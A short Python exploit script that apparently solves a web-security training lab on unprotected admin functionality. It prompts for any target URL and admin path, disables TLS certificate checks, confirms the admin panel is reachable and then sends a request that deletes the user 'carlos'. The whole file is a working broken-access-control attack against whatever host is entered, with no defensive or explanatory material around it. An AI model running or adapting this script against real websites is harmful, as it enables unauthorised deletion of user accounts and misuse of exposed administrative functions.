import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def delete_user(base_url, admin_path):
    admin_panel_url = base_url + admin_path
    r = requests.get(admin_panel_url, verify=False)
    if r.status_code == 200:
        print('(+) Found the administrator panel!')
        print('(+) Deleting Carlos user...')
        delete_carlos_url = admin_panel_url + '/delete?username=carlos'
        r = requests.get(delete_carlos_url, verify=False)
        if r.status_code == 200:
            print('(+) Carlos user deleted!')
        else:
            print('(-) Could not delete user.')
    else:
        print('(-) Administrator panel not found.')
        print('(-) Exiting the script...')

def main():
    # Get base URL from user input
    base_url = input("(+) Enter the target URL (e.g., https://www.example.com): ").strip()
    if not base_url:
        print("(-) Error: No URL provided")
        print("(-) Exiting the script...")
        sys.exit(-1)

    # Get admin path from user input (can be anything)
    admin_path = input("(+) Enter the admin panel path (e.g., /admin): ").strip()
    if not admin_path:
        print("(-) Error: No admin path provided")
        print("(-) Exiting the script...")
        sys.exit(-1)
        
    print("(+) Checking admin panel access...")
    delete_user(base_url, admin_path)

if __name__ == "__main__":
    main()